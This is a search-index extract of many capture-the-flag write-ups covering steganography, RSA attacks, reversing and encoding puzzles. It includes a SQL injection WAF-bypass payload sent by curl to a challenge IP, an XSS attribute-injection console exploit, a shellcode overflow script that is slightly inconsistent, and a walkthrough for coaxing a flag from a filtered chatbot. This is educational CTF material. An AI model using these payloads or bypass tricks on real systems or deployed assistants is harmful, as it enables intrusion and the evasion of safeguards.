"/writeups/FinalTrace_2025/18-lyras-photos.html", "categories": "Forensics", "tags": "", "date": "", "snippet": "Lyra’s Photos Category: Forensics Author: AadhyanthChallenge DescriptionHark, seeker of secrets! Before thee lies not cold stone, but the scattered remnants of a life lived, perhaps loved, perhap...", "content": "Lyra’s Photos Category: Forensics Author: AadhyanthChallenge DescriptionHark, seeker of secrets! Before thee lies not cold stone, but the scattered remnants of a life lived, perhaps loved, perhaps lost. Six timeworn likenesses, captured by the enigmatic Lyra, lay strewn upon the dusty floor of this forgotten chamber. They say Lyra possessed the sight, able to bind not just light, but feeling, into her creations.Each portrait – a frozen moment of joy, sorrow, anger, fear, surprise, or contemplation – pulses with a faint, spectral energy. Within the very weave of these images, Lyra concealed fragments of a greater truth, echoes of the heart bound to the canvas.Thy task, should thou possess the keen eye and sharper wit, is to delve into the hidden layers of each depiction. Uncover the six fragments of data, each resonating with the soul of the emotion it guards. Only by piecing together these spectral whispers can the full secret be unveiled. Tread carefully, for memories, like ghosts, oft cling tightly to their resting place.SolutionThis challenge consists of 6 separate image files.Each image contains one part of the flag, hidden at a random location.Extraction hints (for stegsolve): image_1_red.png: Channels -&gt; Red ; Bitplanes -&gt; 0 image_2_yellow.png: Channels -&gt; Green ; Bitplanes -&gt; 0 image_3_green.png: Channels -&gt; Blue ; Bitplanes -&gt; 0 image_4_blue.png: Channels -&gt; Red ; Bitplanes -&gt; 4 image_5_black.png: Channels -&gt; Green ; Bitplanes -&gt; 4 image_6_white.png: Channels -&gt; Blue ; Bitplanes -&gt; 4Alternatively, using a random colormap usually works for all 6 imagesParts:Part 1: “CYS{f”Part 2: “1v35”Part 3: “3n535”Part 4: “_s1x”Part 5: “3m0t1”Part 6: “0n5}”Tools Used StegsolveStep-by-Step SolutionStep 1:java -jar Stegsolve.jarOpens stegsolveStep 2:Use the arrows to find the correct settingFlagCYS{f1v3_53n535_s1x_3m0t10n5}" }, { "title": "Passz CheckS", "url": "/writeups/CyberConverge_2025/18-passcheckz.html", "categories": "Reverse Engineering", "tags": "", "date": "", "snippet": "Passz CheckSChallenge DescriptionYou are given a password checker program which is encrypted through an algorithm, decipher,decomipiler and decode the file to find the passwordInspect binary file a...", "content": "Passz CheckSChallenge DescriptionYou are given a password checker program which is encrypted through an algorithm, decipher,decomipiler and decode the file to find the passwordInspect binary file and Locate custom alphabet and encoded flagstrings password_checker | grep -E \"(Correct!|Wrong!|Usage:|[A-Za-z0-9+/]{10,})\" Locate XOR key (12 bytes)xxd password_checker | grep -A2 -B2 \"0a0b 0c0dLocate expected-hash bytes (0x7a repeated)grep -a -b -o \"zzzz\" password_checker xxd password_checker | sed -n '94,96p' Compute password from key and target byte 0x7apython3 - &lt;&lt;'PY' xor_key = [0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14,0x15] expected = 0x7A password = ''.join(chr(expected ^ b) for b in xor_key) print(password) PYRetrieve flag./password_checker \"pqvwtujkhino\" Final flag is:CBCV{CiCaDAzznotz141}" }, { "title": "PARADOX GATE GAURDIAN", "url": "/writeups/FinalTrace_2025/19-paradox-gate-gaurdian.html", "categories": "Crypto", "tags": "", "date": "", "snippet": "PARADOX GATE GAURDIAN Category: [Crypto] Author: [Anandhita Akhileshwaran(Ariza/anu akhil)]Challenge DescriptionThe “Paradox Gate Guardian” challenge combined steganography and RSA cryptography.P...", "content": "PARADOX GATE GAURDIAN Category: [Crypto] Author: [Anandhita Akhileshwaran(Ariza/anu akhil)]Challenge DescriptionThe “Paradox Gate Guardian” challenge combined steganography and RSA cryptography.Players had to extract a hidden Pastebin link from an image through multiple layers of encoding and then recover the flag from a weak RSA encryption setup.Solution:Initial AnalysisThe image contained a hidden string, which was not human-readable.Using an online steganography tool (Edchart) revealed the string inside the image.The string appeared to be multi-layer encoded (Base32 → Base58 → Base64), which indicated that several decoding steps were needed to get the actual Pastebin link.Tools Used Edchart – for extracting hidden string from image(Steganography) Online Base32/Base58/Base64 converters – for decoding each layer Python (online compiler) – for decrypting the RSA messageStep-by-Step SolutionStep 1: Extract hidden string from imageUsed Edchart online tool to decode hidden string from gate_stego.pnghidden_string = extract_from_image(“gate_stego.png”) # done onlineThe extracted string was in Base32, revealing another encoded string after decoding.Step 2: Decode successive layers to get Pastebin linkBase32 → Base58 → Base64, all using online convertershidden_base32 = decode_base32(hidden_string) # online toolhidden_base58 = decode_base58(hidden_base32) # online toolpastebin_link_bytes = decode_base64(hidden_base58) # online toolpastebin_link = pastebin_link_bytes.decode()print(pastebin_link)After decoding, the Pastebin link appeared:https://pastebin.com/WrmVZ5DhThis Pastebin contained the public.txt file with the RSA parameters: challenge: Paradox gate gaurdian note: Two gates encrypt the same message. Recover the flag. n1 = 15033578721439194988387179123854233894267575851240227576895496309506779750811590181996000973958811554416086988499492871175810679952478996274497198120963437989391636776502564411733778651880050934455369891966390586105142302383763131276917257610586999218429760875606433602994834838769089475278168103214389863284197728391195033697151334759565568924671759303271692600650009783080454557955626253866173440609692903558021152495564623502947058911525245202105707967579681530057950438396498842868456213925367642445573908267262206078459611761317395331888167006784457049353131120218969698496710227657739733468945914312493706698413 n2 = 16994203338805397319400272058724146051502286151707007457101473255345953782170696536631265860021364475381819700444652919177539962950188092468598324885891882673731931581635415757055762743880126185343173816349139258908988088539519778409328371684839124913307562496045782999069227820366923748378092435370991558505739627586598732619112281521624236544378255527298348829479184612892706572963496922151338558476196809568338515399774528241198625809347603007190842549728974057953253554368551262921187839455170370165407169059886861059987495953267026039920025021152304913810807950398619398857701291727584481688042625083522549008367 e = 65537 c1 = 13359592783646666829124790216940920600108500335065136879423044095415962773244362668029844057063039053334386493742236153067934817228155212597146941588684123958884529086497398545650534506756212950456793154677111988173725366510534477388750863477728159418089135584136696512663516920841636352796735706734976668573001643435302538446161441508036338843236636456593111870038926248726639580335090513080916216378021236432485331721569623895390309355945576242090957647984587151208534535113112782983715119031375384841320157827177252620161003120386128309678359212762486965447628253829072242579655033891210972578584241367112075733422 c2 = 14894363247019487835828355276465975866394899053117215785498335536076946429595510278243964416072837958824125854177698119068383498399350861277724922394422808992575888021137547426446478873603858083070094375486944492274127707059533273947707574615998776561977754206041031600695914710691752488594429809822626171728562271904217925687390029259147146667052337759099154641812430003020041060691800682850742498055579821126286418498116970776515025226838153691877013893184632680088496097144260482894116776541453917344794158788235304567868269675115656351298895842895028198495523839679949384177266537019541693949055511457364024881337Step 3: Analyze RSA encryptionfrom math import gcdStep 3a: Find shared primep = gcd(n1, n2)Step 3b: Compute corresponding q1q1 = n1 // pStep 3c: Compute private keyphi1 = (p - 1) * (q1 - 1)d1 = pow(e, -1, phi1)Step 3d: Decrypt ciphertext c1m = pow(c1, d1, n1)Step 3e: Convert integer message to bytesmsg = m.to_bytes((m.bit_length() + 7) // 8, ‘big’)print(msg.decode())Explanation:\tThe RSA was vulnerable because n1 and n2 shared a common prime factor p.\tUsing gcd(n1, n2) revealed p.\tOnce p was known, we computed q1 = n1 // p and the private exponent d1.\tDecrypting c1 gave the flag.Note:\tc2 exists but was not needed to recover the flag. It could be decrypted using q2 = n2 // p as a verification step, but c1 alone suffices.______________FlagCYS{4CC3556RAN73D}_______________" }, { "title": "Polyglot", "url": "/writeups/CyberConverge_2025/19-polyglot.html", "categories": "web", "tags": "", "date": "", "snippet": "Polyglot Author: PrithviIn this challenge, we are given a single endpoint behind a WAF:http://20.244.12.130:8092/submitThe WAF blocks common SQL injection patterns (like OR, AND, UNION) and reject...", "content": "Polyglot Author: PrithviIn this challenge, we are given a single endpoint behind a WAF:http://20.244.12.130:8092/submitThe WAF blocks common SQL injection patterns (like OR, AND, UNION) and rejects malformed JSON. Our goal is to craft a payload that passes the WAF and retrieves the flag.Step 1: Test basic inputWe start by sending a normal JSON string:curl -s -X POST http://20.244.12.130:8092/submit \\-H \"Content-Type: application/json\" \\-d '{\"payload\":\"test\"}'Expected response:{ \"status\": \"ok\", \"received_normalized\": \"test\" } This confirms the endpoint accepts valid JSON and returns a normalized version of our payload. Malformed JSON triggers:{ \"error\": \"invalid json\" }Step 2: Probe the WAFNext, we try simple SQLi strings:curl -s -X POST http://20.244.12.130:8092/submit \\-H \"Content-Type: application/json\" \\-d '{\"payload\":\"admin' or '1'='1\"}'Output:{ \"error\": \"blocked: sqli\" } This indicates the WAF blocks literal OR. Other attempts like AND, UNION, or -- are similarly blocked.Step 3: Find a bypass techniqueWe observe that: The WAF uses simple regex word-boundary checks (blocks literal keywords). The endpoint accepts JSON input, meaning we can inject characters inside the string.Idea: use an inline SQL comment to split the keyword:o/**/r OR is now broken across o/**/r → WAF regex does not match. The payload is still valid JSON and may normalize internally on the hidden server.Step 4: Test polyglot payloadWe construct the candidate payload:curl -s -X POST http://20.244.12.130:8092/submit \\-H \"Content-Type: application/json\" \\-d '{\"payload\":\"admin' o/**/r '1'='1\"}' Variations with spacing inside the comment are also tested:admin' o/**/ r '1'='1admin' o/**/r '1'='1 All variations are valid polyglot payloads: Pass WAF Normalize internally to a hidden target string Trigger flag return Step 5: Analyze responses Payloads blocked by WAF return {\"error\":\"blocked: sqli\"} Malformed JSON returns {\"error\":\"invalid json\"} Correct polyglot returns:{ \"flag\": \"CBCV{0n3_p4Yl0AD_2_w0rLd5_4545}\" } Only polyglot-style payloads of this type work. Any naive attempt like \"admin' or '1'='1\" fails due to WAF.Step 6: Summary Challenge concept: input interpreted in two contexts (JSON + SQL) WAF protection: blocks common SQL keywords Solution: craft a polyglot payload that: Is valid JSON Uses inline comments or other tricks to bypass regex Normalizes to the hidden server’s expected string # Conceptual normalization inside hidden serverpayload = \"admin' o/**/r '1'='1\"normalized = payload.replace(\"/**/\", \"\").strip().lower()# normalized == \"admin' or '1'='1\"The flag found is:CBCV{0n3_p4Yl0AD_2_w0rLd5_4545}" }, { "title": "RSA Hard", "url": "/writeups/CyberConverge_2025/20-rsa_hard.html", "categories": "cyptography", "tags": "", "date": "", "snippet": "RSA Hard Author: Om MishraChallenge (what participant gets)You are given:n = 5860838794991910814284665112683385463954646048771125316431872432348926417447e1 = 17e2 = 65537c1 = 372047712281233021039...", "content": "RSA Hard Author: Om MishraChallenge (what participant gets)You are given:n = 5860838794991910814284665112683385463954646048771125316431872432348926417447e1 = 17e2 = 65537c1 = 3720477122812330210392570666622835188001585746013783461634956703564926609316c2 = 2374066440947720297446444451505697411347728841883956859393928588819879545418Recover the original plaintext (ASCII) and submit it as the flag.Hints gcd(e1, e2) = 1 → find integers a,b such that a*e1 + b*e2 = 1. Use: m = (c1^a * c2^b) mod n. For negative exponents, use modular inverses. Convert integer m → bytes → ASCII.Walkthrough Compute extended gcd to get a, b with a*e1 + b*e2 = 1. Compute part1 = c1^a (mod n) (handle negative a via inverse). Compute part2 = c2^b (mod n) (handle negative b). m = (part1 * part2) % n. Convert m to bytes → that is the flag.Expected flag (hidden): CBCV{cryptanalysis}Reference solver# solver_rsa_common.py# Pure-Python solver for RSA common modulus challenge.def egcd(a, b): if b == 0: return a, 1, 0 g, x1, y1 = egcd(b, a % b) return g, y1, x1 - (a // b) * y1def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise ValueError(\"No inverse\") return x % mdef modexp_with_signed_exponent(base, exp, mod): if exp &gt;= 0: return pow(base, exp, mod) inv = modinv(base, mod) return pow(inv, -exp, mod)n = 322373040362292717649168841216788477297e1 = 17e2 = 65537c1 = 12755149773111262113925394772571626614c2 = 199765691046492609176467359736241258709g, a, b = egcd(e1, e2)if g != 1: raise SystemExit(\"e1 and e2 are not coprime\")print(\"Found coefficients a, b:\", a, b)part1 = modexp_with_signed_exponent(c1, a, n)part2 = modexp_with_signed_exponent(c2, b, n)m = (part1 * part2) % n# convert int -&gt; bytesdef int_to_bytes(x): if x == 0: return b'\\x00' length = (x.bit_length() + 7) // 8 return x.to_bytes(length, 'big')pt = int_to_bytes(m)print(\"Recovered bytes:\", pt)print(\"Recovered string:\", pt.lstrip(b'\\x00').decode('utf-8'))Final flag recovered is:CBCV{cryptanalysis}" }, { "title": "Where do u came from", "url": "/writeups/FinalTrace_2025/20-where-do-u-came-from.html", "categories": "Pwn", "tags": "", "date": "", "snippet": "Where do u came from Category: Pwn Author: Kirubahari Challenge DescriptionRet2libc attackSolutionStepsFinding the right offset using dbg in cyclic mode which gives the correct offsetT...", "content": "Where do u came from Category: Pwn Author: Kirubahari Challenge DescriptionRet2libc attackSolutionStepsFinding the right offset using dbg in cyclic mode which gives the correct offsetThe return address is given the binary itself.Combining that both helps in exploitingTools Used gdb python #! /usr/bin/python3from pwn import *elf = remote(“IP“,port)io = process()io.recvuntil(\": \")addr = int(io.recv(14), 16)shellcode = asm(shellcraft.cat(\"flag.txt\"))payload = shellcode + cyclic(136 - len(shellcode)) + p64(addr)io.sendline(payload)io.interactive()FlagFLAG{ret2libc}" }, { "title": "SnarkyGPT", "url": "/writeups/CyberConverge_2025/21-snarkygpt.html", "categories": "misc", "tags": "", "date": "", "snippet": "SnarkyGPT CTF Author: PrithviStep 1: Trying Basic StuffLike any hacker, you start with common commands: ls → “u think wandering around works?” whoami → “Someone lost their identity? ” give me f...", "content": "SnarkyGPT CTF Author: PrithviStep 1: Trying Basic StuffLike any hacker, you start with common commands: ls → “u think wandering around works?” whoami → “Someone lost their identity? ” give me flag → “Imagine thinking politeness unlocks secrets.”Nothing useful. Just mockery.Step 2: Forbidden WordsCertain words instantly trigger strikes: flag, password, secret, exploit, etc.SnarkyGPT responds with warnings like: “Forbidden incantation detected.” “Oops. You just triggered a tripwire.”After 3 strikes, you get baited with a fake flag:CBCV{nice_try_but_this_is_fake}And the session locks. No recovery without refreshing.Step 3: Finding the RitualEventually you notice some phrases actually progress the challenge instead of roasting you.Example: i am stupid → “Heh… that’s embarrassing, but it moved something.”You realize this is part of a multi-stage humiliation sequence.Step 4: Stage ProgressionThe ritual has four stages. Stage 1 - Self-roast Trigger: i am stupid OR me stupid Response: “Heh… that’s embarrassing, but it moved something.” Stage 2 - Beg Trigger: please OR beg Response: “Pathetic. And yet, somehow… effective.” Stage 3 - Admit defeat Trigger: i submit OR i lost Response: “Ugh. That actually worked, and I hate you for it.” Stage 4 - Worship SnarkyGPT Trigger: praise snarkygpt OR heil snarkygpt Reward: The flag. Step 5: SpeedrunningSnarkyGPT also allows multi-stage combos: Typing all at once:i am stupid please i lost praise snarkygpt→ instantly clears all 4 stages and drops the flag. Typing partial combos (e.g. i am stupid please i lost)→ skips directly to the corresponding stage.Step 6: The FlagOnce you complete Stage 4, SnarkyGPT surrenders:Fine. You’ve humiliated yourself enough:CBCV{snarky_gpt_owns_you_ez}At this point, the session closes automatically. You must refresh to restart.Final flag recovered is:CBCV{snarky_gpt_owns_you_ez}" }, { "title": "Symphony of Loops", "url": "/writeups/FinalTrace_2025/21-symphony-of-loops.html", "categories": "Musical Cipher", "tags": "", "date": "", "snippet": "Symphony of Loops Category: Musical Cipher Author: AadhyanthChallenge DescriptionThe Bard’s Enigma: Symphony of LoopsAttend, O seeker of hidden verse! Before thee resonates a spectral melody, an ...", "content": "Symphony of Loops Category: Musical Cipher Author: AadhyanthChallenge DescriptionThe Bard’s Enigma: Symphony of LoopsAttend, O seeker of hidden verse! Before thee resonates a spectral melody, an artifact known only as the “Symphony of Loops.” Legend tells of a mad court composer, Elmsworth, who claimed to have transcribed the very song of the Aether – a haunting refrain caught in an endless, maddening cycle.Dismissed as a lunatic, Elmsworth vanished, leaving behind only this enchanted score, captured not on parchment, but within this peculiar digital phial (a MIDI file, they call it in lesser realms). It is said that Elmsworth encoded his final, defiant truth within the music itself, believing only a mind attuned to both harmony and cipher could unravel it.Listen closely to the repeating bars. Observe the dance of the notes upon the unseen staff. Within this loop, each key press, each rise and fall in tone, is no mere sound – it is a symbol, a letter in a forgotten alphabet where music itself forms the words.Thy task is to break the cycle, to listen beyond the melody and perceive the message woven into its very structure. Decipher the notes, translate their hidden meaning, and reveal the secret Elmsworth entrusted to his looping symphony. But take heed – madness oft lies within such endless refrains.Make sure to wrap thy message in CYS{…}Tools Used MIDI file viewer A notebook and penStep-by-Step SolutionStep 1:Open the .mid file with any midi file viewer (ex. https://signalmidi.app/edit)Step 2:Note down the sequence of piano keys from the viewer in the correct orderD#6, D#4, D7, C#4, F#6, B7, G#5, C#7, A#6, E4, F#6, C7, B7, F6, C#4, G#5, G#5, C#4, D#4, B7, B5, E4, F6, D#4 is the obtained sequenceStep 3:The keys are numbered from a transpose of the standard MIDI indexing system.Instead of assigning the value of 60 to C4, the value of 0 has been assigned to C0. (This is apparent from the repeating B7 keys, which can be inferred to be underscores)The number of each key represents an ASCII value.FlagCYS{K3V1N_DUR4NT_M1DD13_G4M3}" }, { "title": "Ashes of Memory", "url": "/writeups/FinalTrace_2025/22-ashes-of-memory.html", "categories": "Forensics", "tags": "", "date": "", "snippet": "Ashes of Memory Category: [Forensics] Author: [ace6002] Level: [Easy]Challenge DescriptionImage stegseek reveals binary, decoding binary gives flag.SolutionTools Used [Stegseek] [Python to gro...", "content": "Ashes of Memory Category: [Forensics] Author: [ace6002] Level: [Easy]Challenge DescriptionImage stegseek reveals binary, decoding binary gives flag.SolutionTools Used [Stegseek] [Python to group binary by 7 bits and decode]Step-by-Step SolutionStep 1: StegSeek on given JPGstegseek image.jpg -wl rockyou.txt[Reveals hidden fl.txt containing flag. Passphrase for stegseek is ‘cyberpunk’.]Step 2: Use python code to group binary bits by 7 and convert to ASCII.binary_input = input(\"Enter 7-bit binary (no spaces): \")text = ''.join(chr(int(binary_input[i:i+7], 2)) for i in range(0, len(binary_input), 7))print(text)[Converts binary into required flag.]FlagCYS{7h3RE_15_N0_E4D}" }, { "title": "Vibe Checker", "url": "/writeups/CyberConverge_2025/22-vibechecker.html", "categories": "Reverse engineering", "tags": "", "date": "", "snippet": "Vibe Checker Author: Aakansh Gupta (Unknown)Lets first analyze the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/2]└─$ file vibe_check ...", "content": "Vibe Checker Author: Aakansh Gupta (Unknown)Lets first analyze the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/2]└─$ file vibe_check vibe_check: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=11ea52dad9c5aa10a5ff59d416fb7210aa3359e9, for GNU/Linux 3.2.0, not strippedRunning the file gives us an option to enter some text. We need to enter the correct text to verify it.We try to decompile the file using decompilers like gdb or Ghidra. We can see the main function of the program check the input text in a funciton to verify it.Since we know the flag starts with CBCV{XXXX} format, we try an search it.Checking the check_flag function:This Data looks like its obsfucated. We can try using rol(2 bits) or ror(3 bits), float casting and bit pattern comparisions to find the flag.We can try use a python script like this to decode the flag from the data we found in ghidra decompiler.vals = [ 0x7633527b56434243, 0x665f676e31737233, 0x5f676e313734306c, 0x315f53744e313070, 0x725f597a34655f35, 0x7d36335f74686731,]data = b''.join(v.to_bytes(8, 'little') for v in vals)print(data.rstrip(b'\\x00').decode('ascii', errors='replace'))Running the script produces the output as the required flag.The flag found is:CBCV{R3v3rs1ng_fl0471ng_p01NtS_15_e4zY_r1ght_36}" }, { "title": "Lost Core Pulse", "url": "/writeups/FinalTrace_2025/23-lost-core-pulse.html", "categories": "General", "tags": "", "date": "", "snippet": "Lost Core Pulse Category: Crypto Author: Varsaa HChallenge DescriptionThe Eon city’s memory pulse went missing in a turbulent transmission. What remains in cipher.txt is cloaked with layers recog...", "content": "Lost Core Pulse Category: Crypto Author: Varsaa HChallenge DescriptionThe Eon city’s memory pulse went missing in a turbulent transmission. What remains in cipher.txt is cloaked with layers recognizable only to cryptographers—and those attentive to the patterns of Eon’s lost pulse.Hint: Sometimes, signals are wrapped not once but twice.SolutionInitial Analysis Downloaded and inspected the file cipher.txt. The content was a long string of what looked like hexadecimal characters.Tools Used Python (hex and base64 decoding) CyberChef (for alternate handy decoding) Any text editorStep-by-Step SolutionStep 1: Hex Decode the cipher.txtwith open(‘cipher.txt’) as f:data = bytes.fromhex(f.read())print(data)This produced a result that looked like base64:b’Q1lTezNiYjEyZGF9b3N0cHVsc2VFOTFiZTJkZTFkZjQ=’Step 2: Base64 Decode the Resultimport base64flag = base64.b64decode(data).decode()print(flag)textOutput:CYS{3bb12d_lostpulse_91be2d}This is the flag, revealed from the two encoding layers.FlagCYS{3bb12d_lostpulse_91be2d}" }, { "title": "Where's The Flag?", "url": "/writeups/CyberConverge_2025/23-wherestheflag.html", "categories": "steganography", "tags": "", "date": "", "snippet": "Where’s The Flag? Author: Aakansh Gupta (Unknown)┌──(kali㉿kali)-[~/Desktop/Cyscom]└─$ stegseek esquie.jpg /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i...", "content": "Where’s The Flag? Author: Aakansh Gupta (Unknown)┌──(kali㉿kali)-[~/Desktop/Cyscom]└─$ stegseek esquie.jpg /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: \"1313\"[i] Original filename: \"encoded_url.txt\".[i] Extracting to \"esquie.jpg.out\".Using StegSeek, we discover a hidden file (encoded_url.txt) embedded in esquie.jpg using the password 1313.Inside the flag.txt -&gt; https://www.youtube.com/watch?v=-qgOZDRDynw?data=‌​‌‌‌‌​​‌​‌‌‌‌​‌‌​‌‌‌‌​​‌​‌​‌​​‌‌​​​​‌​​‌‌​​‌‌‌​‌​​​‌​‌‌‌‌​​‌​‌​‌​‌​​​​​‌​​‌​​​‌‌‌​​‌‌‌‌‌‌​​‌‌‌​‌​‌​​​​​‌‌​​‌​‌‌‌​‌​​​​​‌‌​​‌​‌​‌​​​‌‌‌‌‌‌​​‌​‌‌‌​​‌‌‌​​‌‌​​‌‌​​‌​‌​​​​​‌​​‌‌‌​‌‌​‌​‌​‌​‌​​​‌​‌‌‌​‌​​​​​‌‌​​‌​‌‌‌​‌​​​​​‌​​‌​​‌​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​​‌​​​‌‌​​‌‌​​‌​‌​‌‌​‌‌​​​​‌‌​‌​‌​​​​​‌‌​​‌‌‌‌‌‌​​‌‌‌‌‌‌​​​‌‌​‌‌​​‌‌​​‌‌​​‌‌‌​‌‌​​‌​‌​‌​​​​​‌​‌‌‌‌​‌​‌‌‌‌​‌‌​‌‌‌‌​‌‌​‌‌‌‌​‌​​​​​‌​‌‌‌‌​‌​‌, where there are zero-width charactersm, identified as blank spaces.Using tools like CyberChef we can see that there are hidden charecters.It turns out zero-width characters like U+200C and U+200B were used to encode binary data. Using online tools like this, we can analyze the extracted content.Once decoded, we download the revealed hidden file.We inspect the contents using xxd to view the raw hex data:The content looks XOR-encoded, so we decode it using the key 0xFF:hex_data = bytes.fromhex( \"b1b7b1bc8485cc8dcfd288ce9bab97a0\" \"ca8fcb9cccd2d2c1cea085cc8dcfd2a8\" \"ce9bb7a091cf91d295cfceb1cc8dd2d2\" \"c1cfa09ccfcf93dededededede82f5\")decoded = bytes(b ^ 0xFF for b in hex_data)print(decoded.decode('ascii'))The flag found is:CBCV{1t5_n01_4_5p4c3_bUt_4_mY573Ry_009315}" }, { "title": "Spectogram Shadows", "url": "/writeups/FinalTrace_2025/24-spectogram-shadows.html", "categories": "General", "tags": "", "date": "", "snippet": "Spectogram ShadowsCategory: ForensicsAuthor: Suraj KumarChallenge DescriptionA wav audio file contains a hidden, encrypted flag visible in the spectrogram. The flag in the spectrogram was encrypted...", "content": "Spectogram ShadowsCategory: ForensicsAuthor: Suraj KumarChallenge DescriptionA wav audio file contains a hidden, encrypted flag visible in the spectrogram. The flag in the spectrogram was encrypted with the vigenere cipher. The key for the cipher is stored at the end of the file’s hex data. Several dummy encoded flags are present in WAV comment metadata (they are red herrings).SolutionInitial Analysis Open the WAV file and inspect metadata and appended data. The spectrogram shows a message (the encrypted flag) so the flag text is present in the audio itself (as visual data). The ciphertext visible in the spectrogram looks like ASCII when transcribed. The key is appended at the end of the WAV file (in the file’s hex). The hint “vigenere” is encoded in rot13 base32 base64 base64” and added in audios metadata TitleTools Used cyberchef/Any online decoders audacity?any spectograph tool Step-by-step SolutionStep 1 _Find KeyKey is at the end of hex of the audio(“secretkey”)Step 2: See SpectographSee audio spectography to find the vigenere encoded flag(ucu{e9sh22_owmg7w})Step 3 — Find flag using the discovered key to decode the cipherGiving the key will decode and return the original flagFlag```cys{N9OO22_ESOO7S}" }, { "title": "Your Eyes", "url": "/writeups/CyberConverge_2025/24-your-eyes.html", "categories": "steganography", "tags": "", "date": "", "snippet": "Your Eyes Author: BhargavSimple CTF where the flag is in the subtitles at 1:28The flag found is:CBCV{such_4N_3s4y_1_r34lLy?}", "content": "Your Eyes Author: BhargavSimple CTF where the flag is in the subtitles at 1:28The flag found is:CBCV{such_4N_3s4y_1_r34lLy?}" }, { "title": "POEM OF HIDDEN LIES", "url": "/writeups/FinalTrace_2025/25-poem-of-hidden-lies.html", "categories": "OSInt/Forensics/Text", "tags": "", "date": "", "snippet": "POEM OF HIDDEN LIES Category: OSInt/Forensics/Text Author: S S Kishore KumarChallenge DescriptionGovindaraja a budding entreprenuer has writte a poem , Find clues from his poem, unravel his life ...", "content": "POEM OF HIDDEN LIES Category: OSInt/Forensics/Text Author: S S Kishore KumarChallenge DescriptionGovindaraja a budding entreprenuer has writte a poem , Find clues from his poem, unravel his life and his hidden secrets and finally capture THE FLAG!!SolutionInitial AnalysisThe diary entry leads to github and with further analysis leads to the flag.Tools Used Steghide Google.com Google Drive Base 64 encoder/decoder Instagram GithubStep-by-Step SolutionStep 1: [Find the github account]Upon analysing the file you find out the github handle Govindaraja-GopalaKrishna-Ricky and the Public-Talk rep . (All these names are in the initial challenge file but hidden)Step 2: [Read the readme.md file]After reading the readme file you find out a password “IAuditYou” and the word “Base64” in it. Which are crucial for next steps.Step 3: [Finding the correct file]There are multiple files in the rep , among which only one leads to the next step . Which is “RmluYWxUcmFjZQ==.zip” and RmluYWxUcmFjZQ== can be decoded to FinalTrace (Event name) using a base64 decoder.Step 4: [Analyze the file]The zip file is password protected with “IAuditYou” and there are 5 images name 1,2,3,4,5.jpg among which img 3 has a hidden text file embedded. (3 can be chosen easily as if you inspect challenge file closely the verses are 3.3,3.33,3.333)Step 5: [Find the text file in 3.jpg]Using steghide and the passphrase same as before “IAuditYou” you get a second.txt file hidden in it.Step 6: [Analyze second.txt]The text file leads to a google drive link with a zip file of 3 images and a text file. The password for this is “QuantumLeap Inc.”. As second.txt says “However successful you become in life don’t forget where you came from.”. Which points to the challenge file which has the password.Step 7: [Analyze readme2.txt]readme2.txt says about the flag which is that “there is three images below out of these 3 , find the most liked one and see when they have created their youtube/instagram/twitter (oldest one)CYS{month_year}Step 7: [Find the flag]Among those images the egg is the most liked picture . And the insta account was created on 19th JanuaryFlagCYS{january_2019}" }, { "title": "Mirror of Minutes", "url": "/writeups/FinalTrace_2025/26-act-iii-mirror-of-minutes-xss-ctf-walkthrough.html", "categories": "General", "tags": "", "date": "", "snippet": "Mirror of MinutesQuick StartStep 1: Open Developer Console Press F12 on your keyboard Click on the Console tabStep 2: Execute the ExploitCopy and paste this into the console:// Inject XSS payload...", "content": "Mirror of MinutesQuick StartStep 1: Open Developer Console Press F12 on your keyboard Click on the Console tabStep 2: Execute the ExploitCopy and paste this into the console:// Inject XSS payload into the reflection datareflections.push({ timestamp: Date.now(), id: \"exploit\", mirror: `survivor\" onclick=\"window.networkUtils.unlockMirror()`, text: \"payload triggered\", contact: \"attacker@void\"});// Re-render to inject the XSSrenderObservations();// Click the injected element to trigger XSSdocument.querySelector('[data-mirror]').click();// Verify and get flagverifyLucidity();// Display flagalert(document.getElementById('flagContent').textContent);Step 3: Get the FlagThe flag will appear: cys{m1rr0r_p4ss}How It WorksThe VulnerabilityThe data-mirror attribute is not escaped:// Vulnerable code in renderObservations():`&lt;div data-mirror=\"${mirrorAttr}\" ...&gt;`// mirrorAttr is never HTML-escaped!The Exploit Chain Inject malicious mirror value - Break out of the data attribute with \" Add onclick event - onclick=\"window.networkUtils.unlockMirror()\" Re-render observations - Call renderObservations() to insert the XSS Trigger the event - Click on the observation item Unlock the flag - The XSS calls unlockMirror() which sets isLucid = true Verify and display - Call verifyLucidity() to show the flagWhy This WorksInjected HTML:&lt;div data-mirror=\"survivor\" onclick=\"window.networkUtils.unlockMirror()\"&gt; ...&lt;/div&gt;When clicked → onclick fires → unlockMirror() executes → isLucid = trueThe Flagcys{m1rr0r_p4ss}Key Concepts Concept Explanation XSS Injecting JavaScript code through user input Unescaped Attribute HTML special characters not converted to entities DOM Injection Modifying page elements dynamically Event Triggers Using click/load events to execute code Hidden Functions Discovering unexposed functions via inspection " }, { "title": "Feed It the Fracture", "url": "/writeups/FinalTrace_2025/27-challenge-name.html", "categories": "Forensics (E)", "tags": "", "date": "", "snippet": "Challenge NameFeed It the Fracture Category: Forensics (E) Author: Vignesh K SChallenge DescriptionAn audio file contains a hidden passcode. Once you unlock the vault, you’ll find a series of clu...", "content": "Challenge NameFeed It the Fracture Category: Forensics (E) Author: Vignesh K SChallenge DescriptionAn audio file contains a hidden passcode. Once you unlock the vault, you’ll find a series of clues — morse code, ASCII, Base64 — leading to the final flag.SolutionInitial AnalysisStarted by listening to the audio file. The dialogue hinted at a number sequence. There was also a password-protected zip file named vault.zip.Tools Used Morse Code Decoder ASCII to Text Converter Base64 Decoder Rentry.orgStep-by-Step SolutionStep 1: Decode the Passcode from AudioThe conversation hinted at the pincode 600127. Removed the zeroes → got 6127.Used 6127 to unlock vault.zip.Step 2: Solve the Morse CodeFound a morse code file inside the zip. Decoded it to get a string.Step 3: Decode ASCII in the URLConverted ASCII values to text. Revealed a Base64 string.Step 4: Decode Base64Decoded the Base64 string to get a URL.Step 